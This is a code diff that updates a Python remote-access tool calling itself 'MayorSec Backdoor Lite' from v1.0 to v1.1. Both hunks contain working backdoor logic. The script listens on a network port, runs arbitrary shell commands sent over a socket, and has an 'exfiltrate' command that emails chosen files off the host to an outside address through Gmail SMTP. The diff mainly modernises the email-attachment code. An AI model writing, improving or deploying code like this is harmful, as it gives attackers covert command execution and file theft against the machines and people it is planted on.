@@ -7,17 +7,16 @@ import threading
 import time
 from datetime import datetime
 import smtplib
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
+import mimetypes
 from email import encoders
+from email.message import EmailMessage
 hostIP = '0.0.0.0'
 hostPort = 8180
 banner = (b"""
 ================================================
                MayorSec Backdoor
                      Lite               
-                     v1.0               
+                     v1.1               
 ================================================
 """)
 time.sleep(1)
@@ -51,29 +50,26 @@ def main():
                         elif data.split(" ")[0] == "exfiltrate":
                             data = (data).strip()
                             file_name = (data.split(" ")[1])
-                            mail_content = file_name + " was sent from " + h_name + "."
+                            mail_content = (file_name + " was sent by Gatekeeper from " + h_name + ".")
                             sender_address = (data.split(" ")[2])
                             sender_pass =  (data.split(" ")[3])
                             receiver_address = (data.split(" ")[4])
-                            message = MIMEMultipart()
+                            message = EmailMessage()
                             message['From'] = sender_address
                             message['To'] = receiver_address
-                            message['Subject'] = ("Attachment sent from " + h_name + ".")
-                            message.attach(MIMEText(mail_content, 'plain'))
+                            message['Subject'] = ("Attachment sent by Gatekeeper from " + h_name + ".")
                             attach_file_name = file_name
-                            attach_file = open(attach_file_name, 'rb')
-                            payload = MIMEBase('application', 'octate-stream')
-                            payload.set_payload((attach_file).read())
-                            encoders.encode_base64(payload)
-                            payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
-                            message.attach(payload)
+                            mime_type, _ = mimetypes.guess_type(attach_file_name)
+                            mime_type, mime_subtype = mime_type.split('/')
+                            with open(attach_file_name, 'rb') as file:
+                                message.add_attachment(file.read(), maintype=mime_type, subtype=mime_subtype, filename=attach_file_name)
                             session = smtplib.SMTP('smtp.gmail.com', 587)
                             session.starttls()
                             session.login(sender_address, sender_pass)
                             text = message.as_string()
                             session.sendmail(sender_address, receiver_address, text)
                             session.quit()
-                            self.csocket.send(bytes(b"Exfil complete.\n"))          
+                            self.csocket.send(bytes(b"Exfil complete.\n"))        
                         else:    
                             command = data
                             p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
@@ -95,29 +91,26 @@ def main():
                         elif data.split(" ")[0] == "exfiltrate":
                             data = (data).strip()
                             file_name = (data.split(" ")[1])
-                            mail_content = file_name + " was sent from " + h_name + "."
+                            mail_content = (file_name + " was sent by Gatekeeper from " + h_name + ".")
                             sender_address = (data.split(" ")[2])
                             sender_pass =  (data.split(" ")[3])
                             receiver_address = (data.split(" ")[4])
-                            message = MIMEMultipart()
+                            message = EmailMessage()
                             message['From'] = sender_address
                             message['To'] = receiver_address
-                            message['Subject'] = ("Attachment sent from " + h_name + ".")
-                            message.attach(MIMEText(mail_content, 'plain'))
+                            message['Subject'] = ("Attachment sent by Gatekeeper from " + h_name + ".")
                             attach_file_name = file_name
-                            attach_file = open(attach_file_name, 'rb')
-                            payload = MIMEBase('application', 'octate-stream')
-                            payload.set_payload((attach_file).read())
-                            encoders.encode_base64(payload)
-                            payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
-                            message.attach(payload)
+                            mime_type, _ = mimetypes.guess_type(attach_file_name)
+                            mime_type, mime_subtype = mime_type.split('/')
+                            with open(attach_file_name, 'rb') as file:
+                                message.add_attachment(file.read(), maintype=mime_type, subtype=mime_subtype, filename=attach_file_name)
                             session = smtplib.SMTP('smtp.gmail.com', 587)
                             session.starttls()
                             session.login(sender_address, sender_pass)
                             text = message.as_string()
                             session.sendmail(sender_address, receiver_address, text)
                             session.quit()
-                            self.csocket.send(bytes(b"Exfil complete.\n"))                                
+                            self.csocket.send(bytes(b"Exfil complete.\n"))                          
                         else:    
                             command = data
                             p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
